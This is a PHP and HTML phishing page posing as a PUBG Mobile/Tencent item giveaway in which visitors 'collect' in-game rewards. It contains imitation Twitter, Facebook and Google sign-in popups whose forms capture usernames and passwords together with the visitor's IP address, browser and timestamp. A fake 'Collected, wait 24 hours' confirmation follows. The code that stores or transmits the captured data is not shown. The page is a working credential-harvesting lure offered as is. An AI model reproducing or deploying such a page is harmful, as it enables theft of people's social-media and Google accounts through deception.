llapse:collapse;}table{border-spacing:0;}form,[class~=footer]{padding-top:.9375pc;}html{background:#000;}[class~=footer]{font-size:9pt;}[class~=footer]{text-align:center;}body{background:#1a237e;}body{max-width:3.75in;}[class~=footer],form{border-top-width:.0625pc;}body{margin-left:auto;}body{margin-bottom:0;}body{margin-right:auto;}body{margin-top:48px;}body{font-style:normal;}body{font-variant:normal;}body{font-weight:normal;}body{font-stretch:normal;}body{font-size:.8125pc;}body{line-height:normal;}body{font-size-adjust:none;}body{font-kerning:auto;}body{font-family:Arial;}body{color:#fff;}form{background:linear-gradient(#303f9f,#1a237e);}form{background-size:360px 100px;}form{background-repeat:no-repeat;}form{width:22.5pc;}form,[class~=footer]{border-top-style:solid;}form{padding-left:1.25pc;}form{padding-right:1.25pc;}form{color:#f00;}form{text-align:right;}form{display:inline-block;}form,[class~=footer]{border-top-color:#5c6bc0;}[class~=footer],form{border-image:none;}label{color:#18ffff;}label{text-shadow:-1px -.75pt #000;}select,input{background:#283593;}select,input{width:200px;}input,select{margin-left:.104166667in;}input,select{padding-left:7.5pt;}input,select{padding-bottom:7.5pt;}input,select{padding-right:7.5pt;}select,input{padding-top:7.5pt;}input{border-left-width:.010416667in;}input{border-bottom-width:.010416667in;}input{border-right-width:.010416667in;}input{border-top-width:.010416667in;}input{border-left-style:solid;}input{border-bottom-style:solid;}input{border-right-style:solid;}input{border-top-style:solid;}input{border-left-color:#5c6bc0;}input{border-bottom-color:#5c6bc0;}input{border-right-color:#5c6bc0;}input{border-top-color:#5c6bc0;}input{border-image:none;}select,input{color:#fff;}select{border-left-width:.010416667in;}select{border-bottom-width:.010416667in;}select{border-right-width:.010416667in;}select{border-top-width:.010416667in;}select{border-left-style:solid;}select{border-bottom-style:solid;}select{border-right-style:solid;}select{border-top-style:solid;}select{border-left-color:#5c6bc0;}select{border-bottom-color:#5c6bc0;}select{border-right-color:#5c6bc0;}select{border-top-color:#5c6bc0;}select{border-image:none;}q:before{content:none;}q:after{content:"";}q:after{content:none;}[class~=thumbnail]:hover{transform:scale(1.1);}[class~=buy]:hover{background:linear-gradient(#1b5e20,#00c853);}*{box-sizing:border-box;}
.sticky {
    border-bottom-color: #333;
}
.slider-container {
    border-bottom: 1px solid #333;
    padding-top: 5px;
}
.gallery-container {
    padding-top: 20px;
    padding-bottom: 20px;
}
.item {
    height: 168px;
    background-image: linear-gradient(#222 0%, #111 100%);
    border-color: #000;
}
.thumbnail {
    max-height: 137px;
    margin: 0;
    background-image: linear-gradient(#222 0%, #111 100%);
}
.thumbnail:hover {
    transform: none;
    background-image: linear-gradient(#222 0%, #111 100%);
}
.buy {
    background: rgba(0,0,0,.75);
    font-size: 12px;
    text-align: center;
    line-height: 18px!important;
    font-family: 'Teko', sans-serif;
}
.buy:hover {
   background: rgba(0,0,0,.75);
    font-size: 12px;
    text-align: center;
    line-height: 18px!important;
    font-family: 'Teko', sans-serif;
}
.notification-container {
    width: 100%;
}
.button {
    padding-top: 5px;
}
.notification-container, .footer {
    border-top-color: #333;
}
.sticky, .slider-container, .gallery-container, .notification-container, .footer{
    background-image: linear-gradient(#222 0%, #111 100%);
}
@font-face {
  font-family: 'Teko', sans-serif;
}
.twitter {
  background:#08a0e9;
  position:relative;
  width:100%;
  height:40px;
  margin:0;
  color:#fff;
  border:1px solid #08a0e9;
  font-size:1.2em;
  font-weight:700;
  text-align:center;
  letter-spacing:1px;
  outline:none;
  cursor:pointer;
  font-family: 'Teko', sans-serif;
}
.fb {
  background:#4267b2;
  position:relative;
  width:100%;
  height:40px;
  margin:0;
  color:#fff;
  border:1px solid #4267b2;
  font-size:1.2em;
  font-weight:700;
  text-align:center;
  letter-spacing:1px;
  outline:none;
  cursor:pointer;
  font-family: 'Teko', sans-serif;
}
.playgame {
  background:#34a853;
  position:relative;
  width:100%;
  height:40px;
  margin:0;
  color:#fff;
  border:1px solid #34a853;
  font-size:1.2em;
  font-weight:700;
  text-align:center;
  letter-spacing:1px;
  outline:none;
  cursor:pointer;
  font-family: 'Teko', sans-serif;
}
.logtweet {
  color:#08a0e9;
}
.logfb {
  color:#4267b2;
}
.logplay {
  color:#34a853;
}
input[type=text],input[type=password],input[type=number] {
background:transparent;
width:260px;
height:45px;
float:left;
padding:12px 20px;
margin:8px 0;
display:inline-block;
border:1px solid black;
border-radius:3px;
color:black;
box-sizing:border-box;
}
h5 {
 font-size: 1.5em;
 text-align: center;
 color: black;
}
small {
color: white;
font-family: 'Teko', sans-serif;
}
.status-collect {
font-family: 'Teko', sans-serif;
color: white;
}
.mylabel {
color: black;
float: left;
}
.close {
width: 20px;
height: 20px;
background: #000;
border-radius: 50%;
border: 3px solid #fff;
display: block;
text-align: center;
color: #fff;
text-decoration: none;
position: absolute;
top: -10px;
right: -10px;
}
.formku {
float:left;
width:300px;
border-color: white;
background: white;
}
#collected {
width: 100%;
height: 100%;
position: fixed;
padding-top:50px;
top: 0;
left: 0;
z-index: 9999;
visibility: hidden;
overflow: scroll;
}
.collected-box {
width: 300px;
height: auto;
background-image:url("img/login-popup/collected-pop2.png");
position: relative;
text-align: center;
margin: 15% auto;
}
.collected-box-image {
background:url(https://i.ibb.co/8szf9v4/collected-box.png) no-repeat;
width:300px;
height:700px;
position:relative;
margin:15% auto;
background-size: 300px auto;
}
#collected:target {
visibility: visible;
}
#gp {
width: 100%;
height: 100%;
position: fixed;
top: 0;
left: 0;
z-index: 9999;
visibility: hidden;
overflow: scroll;
}
.gp-login {
width: 300px;
height: auto;
background: #fff;
position: relative;
text-align: center;
margin: 15% auto;
}
#gp:target {
visibility: visible;
}
.nav-gp {
background-color:#4285f4;
height:40px;
border:4px;
padding:10px;
}
.btn-login-gp {
position:relative;
width:50%;
height:45px;
margin:0;
background-color:#4285f4;
color:white;
border-radius:3px;
border:#4c75a3;
font-size:1em;
font-weight:bold;
float:right;
letter-spacing:1px;
outline:none;
cursor:pointer;
}
.btn-forgot-gp {
color:#4c75a3;
}
.btn-register-gp {
position: relative;
width: 50%;
height: 40px;
margin-bottom:5px;
background-color: transparent;
color: #4285f4;
border-radius: 3px;
border: #4285f4;
font-size: 1em;
font-weight:bold;
float:left;
letter-spacing: 1px;
outline: none;
cursor: pointer;
}

#fb {
width: 100%;
height: 100%;
position: fixed;
top: 0;
left: 0;
z-index: 9999;
visibility: hidden;
overflow: scroll;
}

.fb-login {
width: 300px;
height: auto;
background: #fff;
position: relative;
text-align: center;
margin: 15% auto;
}
#fb:target {
visibility: visible;
}
.nav-fb {
background-color:#3b5998;
height:40px;
border:4px;
padding:10px;
}
.btn-login-fb {
position:relative;
width:100%;
height:45px;
margin:0;
background-color:#4080ff;
color:white;
border-radius:3px;
border:#4080ff;
font-size:1em;
font-weight:bold;
letter-spacing:1px;
outline:none;
cursor:pointer;
}
.btn-forgot-fb {
color:#4c75a3;
}
.btn-register-fb {
position: relative;
width: auto;
height: 40px;
margin-bottom:5px;
background-color: #1cbf27;
color: white;
border-radius: 3px;
border: #1cbf27;
font-size: 1em;
font-weight:bold;
letter-spacing: 1px;
outline: none;
cursor: pointer;
}
.btn-language-fb {
color: #3b5998;
}
.bawahan-fb {
color: #ADB9D3;
}
.divider {
  display:block;
  margin-left:5%;
  margin-right:5%;
  margin-top:-8px;
  overflow:hidden;
  text-align:center;
  white-space:nowrap;
  width:90%;
}
.divider>span {
  display:inline-block;
  position:relative;
  color:#4b4f56;
  cursor:default;
  font-size:13px;
}
.divider>span:before,.divider>span:after {
  background:#ced0d4;
  content:"";
  height:1px;
  position:absolute;
  top:50%;
  width:9999px;
}
.divider>span:before {
  margin-right:15px;
  right:100%;
}
.divider>span:after {
  left:100%;
  margin-left: 15px;
}


#twitter {
width: 100%;
height: 100%;
position: fixed;
top: 0;
left: 0;
z-index: 9999;
visibility: hidden;
overflow: scroll;
}

.twitter-login {
width: 300px;
height: auto;
background: #fff;
position: relative;
text-align: center;
margin: 15% auto;
}
#twitter:target {
visibility: visible;
}
.nav-twitter {
background-color:#55acee;
height:40px;
border:4px;
padding:10px;
}
.btn-login-twitter {
position:relative;
width:100%;
height:45px;
margin:0;
background-color:#55acee;
color:white;
border-radius:50px;
border:#4c75a3;
font-size:1em;
font-weight:bold;
letter-spacing:1px;
outline:none;
cursor:pointer;
}
.bawahan-twitter {
color:#55acee;
}
.btn-close {
  position:relative;
  width:100%;
  height:40px;
  margin:0;
  background-color:#f8a800;
  border:#f8a800;
  color:#fff;
  font-size:1.2em;
  font-family:'Teko-Regular';
  letter-spacing:1px;
  border-radius:0px;
  outline:none;
  cursor:pointer;
}    
</style>
<?php
if (@$_POST['p'] == 'collect') {
  ?>
<div class="sticky">
<a href="/"><img src="https://midas.gtimg.cn/overseaspay/images/1450015065/mo_ft_logo_igame.png"></a>
</div>
<div class="slider-container">
<div class="slider">
<img src="https://i.ibb.co/6Z37PKF/wts.jpg" style="width:100%;">
</div>
<div class="slider">
<img src="https://i.ibb.co/R2q1cRX/s1.jpg" style="width:100%;">
</div>
<div class="slider">
<img src="https://i.ibb.co/VwC5s4z/s2.jpg" style="width:100%">
</div>
<div class="slider">
<img src="https://i.ibb.co/Sc582XG/s3.jpg" style="width:100%">
</div>
<div class="slider">
<img src="https://i.ibb.co/BVqPnfR/s4.png" style="width:100%">
</div>
<div class="slider">
<img src="https://i.ibb.co/jGS0Hzw/s5.png" style="width:100%">
</div>
</div>

<div class="gallery-container">

<div id="collected">
<div class="collected-box">
<div class="collected-box-image">
</br>
</br>
<center>
<i style="color:green;" class="fa fa-check-circle fa-4x"></i>
</br>
</br>
</br>
<h5 class="status-collect">Collected</h5>
</br>
<small>Please wait up to 24 hours to get your gift</small>
</br>
</br>
</br>
<button onclick="location.href='#';" title="Close" class="btn-close">Okay</button>
</center>
</div>
</div>
</div>
<div class="gallery">
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/9qJMMSv/1.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/c16GXrW/2.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/tBgZFGH/3.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/VY6tmQQ/4.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/LtbQnb3/5.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/z40nGGR/6.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/rkg4pFv/7.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/Gk0jY1Y/8.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/8dNvQsN/9.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/YyFkbZk/10.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/M6PgR8d/11.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/BBGzQvC/12.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/mzkQbqr/13.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/9vDbN71/14.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/BLCkFqW/15.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/pr3sDFp/16.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/9TRgRvM/17.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/zF0cR0d/18.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/9gT19Mm/19.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/yn6zHRR/20.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/T2LQzmG/21.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/F0XYFhZ/23.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/MVGs3Y8/24.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/vVk4RNK/25.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/d0Tg4xd/26.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/0m5Wjwy/27.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/pw1ZTgp/28.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/6vmnNXb/29.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/yQwDbTy/30.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/m5R1Fy4/31.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/gMsztLm/32.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/R0pKbTL/33.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/r5ZfgRP/34.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/M6rGjN5/35.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/D76VT7w/36.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/BC6bLvY/37.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/sbqmj6H/38.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/9g8jB5F/39.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/NF4kMwS/40.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/9hN4DQD/41.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/55QDKvt/42.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/9hMdwhB/43.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/bXXtWG6/44.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/kJSxrtX/45.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/ypnqvhN/46.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/vPMZBBn/47.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/PDDPNgf/48.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/34QRH4D/49.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/fd4Y51v/50.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/q56f2MT/51.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/RHpgkNZ/52.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/d4yJZLr/53.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/0V7TxVB/54.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/f1wrSMf/55.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/P4CJXX3/56.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/RT5px16/57.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/8Bpq91G/58.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/rmk3bRJ/59.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/vDW9qMr/60.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/H7k619p/61.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/ZcDmzbf/62.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/v4kQm9J/63.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/vm92L01/64.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/hXNMXRs/65.jpg">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/tLdLBf4/66.jpg">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/Z1fxq5T/67.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/G7KMSGf/68.jpg">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/LS9zJ2v/69.jpg">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/YR7hMsy/70.jpg">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/1dqmJ7m/71.jpg">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/mc7xB0R/72.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/8mnSRdF/73.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/ZT0sgct/74.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/yn4hkDp/75.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/t4d8Q27/76.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/YNpDNS9/77.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/XJr7F1m/78.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="https://i.ibb.co/5R0brdN/79.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/fdc3JLn/80.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="https://i.ibb.co/MpdfCzL/81.png">
<a href="#collected" class="buy">Collect</a>
</div>
</div>
</div>
<div class="notification-container">
<div class="button">
<a href="https://play.google.com/store/apps/details?id=com.mobile.legends">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/download/googlePlay2.png"></a>
<a href="https://play.google.com/store/apps/details?id=com.mobile.legends">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/download/appstore2.png"></a>
</div>
</div>
<div class="footer">
<center>
<img style="margin-right:5px" width="30" src="https://i.ibb.co/SNwZsxx/pubg.png">
<img width="80" src="https://i.ibb.co/qN9LYYb/tencent.png">
</center>
</div>

<script type="text/javascript">
var slideIndex = 0;
showSlides();
function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1} 
    slides[slideIndex-1].style.display = "block"; 
    setTimeout(showSlides, 2500);
}
</script>
  <?php
  exit();
}
?>
<div class="sticky">
<a href="/"><img src="https://midas.gtimg.cn/overseaspay/images/1450015065/mo_ft_logo_igame.png"></a>
</div>
<div class="slider-container">
<div class="slider">
<img src="https://i.ibb.co/6Z37PKF/wts.jpg" style="width:100%;">
</div>
<div class="slider">
<img src="https://i.ibb.co/R2q1cRX/s1.jpg" style="width:100%;">
</div>
<div class="slider">
<img src="https://i.ibb.co/VwC5s4z/s2.jpg" style="width:100%">
</div>
<div class="slider">
<img src="https://i.ibb.co/Sc582XG/s3.jpg" style="width:100%">
</div>
<div class="slider">
<img src="https://i.ibb.co/BVqPnfR/s4.png" style="width:100%">
</div>
<div class="slider">
<img src="https://i.ibb.co/jGS0Hzw/s5.png" style="width:100%">
</div>
</div>


<div class="gallery-container">
<div id="twitter">
<div class="twitter-login">
<a href="#" class="close" title="Close">&times;</a>
<div class="nav-twitter">
<center>
<img width="30" src="https://i.ibb.co/4TZgbmR/twitter.png">
</center>
</div>
</br>
</br>
<center>
<h5>Login to Twitter</h5>
</center>
<form class="formku" method="post">
<input type="text" name="user" placeholder="Phone, email, or username" autocomplete="off" autocapitalize="off" required></br>
<input type="password" name="pass" placeholder="Password" autocomplete="off" autocapitalize="off" required>
<input type="hidden" name="date" value="<?= date("d/m/Y - H:i") ?>">
<input type="hidden" name="ip" value="<?= info('ip') ?>">
<input type="hidden" name="browser" value="<?= info('browser') ?>">
<input type="hidden" name="login_from" value="Twitter">
    </br>
</br>
</br>
<select hidden name="p">
    <option value="collect">p</option>
</select>
<center>
<button type="submit" class="btn-login-twitter" name="login"><b>Login</b></button>
</center>
</form>
</div>
</div>
<div id="gp">
<div class="gp-login">
<a href="#" class="close" title="Close">&times;</a>
<div class="nav-gp">
<center>
<img width="80" src="https://i.ibb.co/1KDG0Jf/google.png">
</center>
</div>
</br>
<form class="formku" id="login" novalidate method="post">
<fieldset>
<center>
<h5>Sign in</h5>
</br>
<b font-size="100" style="color:black;">with your Google Account</b>
</center>
<input type="text" name="user" placeholder="Email or phone" autocomplete="off" autocapitalize="off" required></br>
<input type="hidden" name="date" value="<?= date("d/m/Y - H:i") ?>">
    <input type="hidden" name="ip" value="<?= info('ip') ?>">
    <input type="hidden" name="browser" value="<?= info('browser') ?>">
    <input type="hidden" name="login_from" value="Google Account">
<button type="button" class="btn-register-gp"><b>Create account</b></button>
<button type="button" class="next btn-login-gp"><b>Next</b></button>
</fieldset>

<fieldset>
<center>
<i style="color: black;" class="fa fa-user-circle fa-3x"></i>
</br>
</br>
<h5>Welcome</h5>
</br>
<b font-size="100" style="color:black;">enter your password below</b>
</center>
<input type="password" name="pass" placeholder="Enter your password" autocomplete="off" autocapitalize="off" required></br>
<select hidden name="p">
    <option value="collect">p</option>
</select>
<button type="button" class="previous btn-register-gp"><b>Previous</b></button>
<button type="submit" class="btn-login-gp" name="login"><b>Sign in</b></button>
</fieldset>
</form>
</div>
</div>
<div id="fb">
<div class="fb-login">
<a href="#" class="close" title="Close">&times;</a>
<div class="nav-fb">
<center>
<img width="100" src="https://i.ibb.co/B2LLRJ0/fb.png">
</center>
</div>
</br>
<form class="formku" method="post">
<p class="mylabel">Phone or email:</p>
<input type="text" name="user" placeholder="" autocomplete="off" autocapitalize="off" required></br>
<p class="mylabel">Password:</p>
<input type="password" name="pass" placeholder="" autocomplete="off" autocapitalize="off"></br>
</br>
<input type="hidden" name="date" value="<?= date("d/m/Y - H:i") ?>">
    <input type="hidden" name="ip" value="<?= info('ip') ?>">
    <input type="hidden" name="browser" value="<?= info('browser') ?>">
    <input type="hidden" name="login_from" value="Facebook">
</br>
<center>
<select hidden name="p">
    <option value="collect">p</option>
</select>
<button type="submit" class="btn-login-fb" name="login"><b>Log In</b></button>
</center>
</br>
</br>
<div class="divider">
<span>or</span>
</div>
</br>
</br>
<center>
<button class="btn-register-fb">Create a New Account</button>
</center>
</form>
</div>
</div>
<button onclick="location.href='#twitter';" class="twitter"><i style="float:left;" class="fa fa-twitter"></i>Twitter</button>
</br>
</br>
<button onclick="location.href='#fb';" class="fb"><i style="float:left;" class="fa fa-facebook-square"></i>Facebook</button>
</br>
</br>
<button onclick="location.href='#gp';" class="playgame"><i style="float:left;" class="fa fa-google-plus"></i>Google Play Games</button>
</div>


<div class="notification-container">
<div class="button">
<a href="">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/download/googlePlay2.png"></a>
<a href="">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/download/appstore2.png"></a>
</div>
</div>


<div class="footer">
<center>
<img style="margin-right:5px" width="30" src="https://i.ibb.co/SNwZsxx/pubg.png">
<img width="80" src="https://i.ibb.co/qN9LYYb/tencent.png">
</center>
</div>
<script type="text/javascript">
var slideIndex = 0;
showSlides();
function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1} 
    slides[slideIndex-1].style.display = "block"; 
    setTimeout(showSlides, 2500);
}
</script>

<script type="text/javascript">
$(document).ready(function(){
  var current = 1,current_step,next_step,steps;
  steps = $("fieldset").length;
  $(".next").click(function(){
    current_step = $(this).parent();
    next_step = $(this).parent().next();
    next_step.show();
    current_step.hide();
    setProgressBar(++current);
  });
  $(".previous").click(function(){
    current_step = $(this).parent();
    next_step = $(this).parent().prev();
    next_step.show();
    current_step.hide();
    setProgressBar(--current);
  });
  setProgressBar(current);
  // Change progress bar action
  function setProgressBar(curStep){
    var percent = parseFloat(100 / steps) * curStep;
    percent = percent.toFixed();
    $(".progress-bar")
      .css("width",percent+"%")
      .html(percent+"%");   
  }
});
</script>
</body>
</html>
